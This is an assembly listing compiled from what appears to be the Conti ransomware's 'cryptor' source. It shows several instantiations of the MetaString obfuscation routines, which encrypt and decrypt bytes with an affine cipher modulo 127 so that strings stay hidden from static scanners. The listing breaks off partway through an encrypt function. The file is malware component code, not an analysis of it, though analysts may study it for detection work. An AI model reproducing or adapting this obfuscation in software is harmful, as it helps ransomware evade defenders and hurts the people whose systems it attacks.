; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0CJ@$06U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0CJ@$06U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<41,7,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 07	 sub	 eax, 7
  00006	44 6b c0 1f	 imul	 r8d, eax, 31

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
?decrypt@?$MetaBuffer@$0CJ@$06U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<41,7,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0CJ@$06U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0CJ@$06U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<41,7,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 29	 imul	 r8d, eax, 41		; 00000029H
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 07	 add	 r8d, 7
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0CJ@$06U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<41,7,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0CJ@$06U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0CJ@$06U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<41,7,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0CJ@$06U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<41,7,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GF@$0DG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0GF@$0DG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<101,54,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 36 00 00 00	 mov	 ecx, 54			; 00000036H
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 6b c1 2c	 imul	 r8d, ecx, 44		; 0000002cH

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GF@$0DG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<101,54,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0GF@$0DG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0GF@$0DG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<101,54,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 65	 imul	 r8d, eax, 101		; 00000065H
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 36	 add	 r8d, 54			; 00000036H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0GF@$0DG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<101,54,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0GF@$0DG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0GF@$0DG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<101,54,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0GF@$0DG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<101,54,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BB@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0BB@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<17,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 03	 sub	 eax, 3
  00006	44 6b c0 0f	 imul	 r8d, eax, 15

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BB@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<17,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0BB@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0BB@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<17,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 11	 imul	 r8d, eax, 17
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 03	 add	 r8d, 3
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0BB@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<17,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0BB@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0BB@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<17,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0BB@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<17,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BN@$0EA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0BN@$0EA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<29,64,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 40 00 00 00	 mov	 ecx, 64			; 00000040H
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 6b c1 23	 imul	 r8d, ecx, 35		; 00000023H

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BN@$0EA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<29,64,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0BN@$0EA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0BN@$0EA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<29,64,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 1d	 imul	 r8d, eax, 29
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 40	 add	 r8d, 64			; 00000040H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0BN@$0EA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<29,64,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0BN@$0EA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0BN@$0EA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<29,64,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0BN@$0EA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<29,64,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BP@$0EF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0BP@$0EF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<31,69,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 45	 sub	 eax, 69			; 00000045H
  00006	44 6b c0 29	 imul	 r8d, eax, 41		; 00000029H

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BP@$0EF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<31,69,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0BP@$0EF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0BP@$0EF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<31,69,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 1f	 imul	 r8d, eax, 31
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 45	 add	 r8d, 69			; 00000045H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0BP@$0EF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<31,69,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0BP@$0EF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0BP@$0EF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<31,69,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0BP@$0EF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<31,69,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$06$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$06$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<7,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 66 00 00 00	 mov	 ecx, 102		; 00000066H
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 8d 04 c9	 lea	 r8d, DWORD PTR [rcx+rcx*8]
  00013	45 03 c0	 add	 r8d, r8d

; 40   :     return (a % n + n) % n;

  00016	41 f7 e8	 imul	 r8d
  00019	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001e	41 03 d0	 add	 edx, r8d
  00021	c1 fa 06	 sar	 edx, 6
  00024	8b ca		 mov	 ecx, edx
  00026	c1 e9 1f	 shr	 ecx, 31
  00029	03 d1		 add	 edx, ecx
  0002b	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002e	44 2b c1	 sub	 r8d, ecx
  00031	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00035	41 f7 e8	 imul	 r8d
  00038	41 03 d0	 add	 edx, r8d
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b ca		 mov	 ecx, edx
  00040	c1 e9 1f	 shr	 ecx, 31
  00043	03 d1		 add	 edx, ecx
  00045	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00048	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0004b	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004f	c3		 ret	 0
?decrypt@?$MetaBuffer@$06$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<7,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$06$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$06$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<7,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 07	 imul	 r8d, eax, 7
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 66	 add	 r8d, 102		; 00000066H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
